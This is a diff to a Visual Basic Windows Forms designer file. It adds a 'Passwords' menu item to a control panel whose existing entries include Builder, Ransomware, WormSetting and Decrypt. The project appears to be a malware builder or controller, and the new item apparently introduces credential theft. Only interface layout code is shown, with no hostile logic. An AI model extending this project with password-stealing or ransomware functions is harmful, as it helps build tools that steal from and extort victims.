@@ -66,6 +66,7 @@ Partial Class Form1
         Me.c_usb = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.PictureBox1 = New System.Windows.Forms.PictureBox()
         Me.L2 = New System.Windows.Forms.ListBox()
+        Me.PasswordsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ContextMenuStrip1.SuspendLayout()
         Me.StatusStrip1.SuspendLayout()
         CType(Me.SplitContainer1, System.ComponentModel.ISupportInitialize).BeginInit()
@@ -79,11 +80,11 @@ Partial Class Form1
         '
         Me.ContextMenuStrip1.BackColor = System.Drawing.SystemColors.Control
         Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
-        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.BuilderToolStripMenuItem, Me.ToolStripSeparator1, Me.RansomwareToolStripMenuItem, Me.DetailsToolStripMenuItem, Me.VvvToolStripMenuItem, Me.VisitWebsiteToolStripMenuItem, Me.ComputerToolStripMenuItem, Me.WormSettingToolStripMenuItem, Me.ToolStripSeparator2, Me.AboutToolStripMenuItem})
+        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.BuilderToolStripMenuItem, Me.ToolStripSeparator1, Me.RansomwareToolStripMenuItem, Me.PasswordsToolStripMenuItem, Me.DetailsToolStripMenuItem, Me.VvvToolStripMenuItem, Me.VisitWebsiteToolStripMenuItem, Me.ComputerToolStripMenuItem, Me.WormSettingToolStripMenuItem, Me.ToolStripSeparator2, Me.AboutToolStripMenuItem})
         Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
         Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
         Me.ContextMenuStrip1.ShowImageMargin = False
-        Me.ContextMenuStrip1.Size = New System.Drawing.Size(199, 256)
+        Me.ContextMenuStrip1.Size = New System.Drawing.Size(199, 319)
         '
         'BuilderToolStripMenuItem
         '
@@ -360,6 +361,12 @@ Partial Class Form1
         Me.L2.Size = New System.Drawing.Size(1165, 198)
         Me.L2.TabIndex = 2
         '
+        'PasswordsToolStripMenuItem
+        '
+        Me.PasswordsToolStripMenuItem.Name = "PasswordsToolStripMenuItem"
+        Me.PasswordsToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
+        Me.PasswordsToolStripMenuItem.Text = "Passwords"
+        '
         'Form1
         '
         Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
@@ -427,4 +434,5 @@ Partial Class Form1
     Friend WithEvents DecryptToolStripMenuItem As ToolStripMenuItem
     Friend WithEvents PictureBox1 As PictureBox
     Friend WithEvents VisitWebsiteToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents PasswordsToolStripMenuItem As ToolStripMenuItem
 End Class
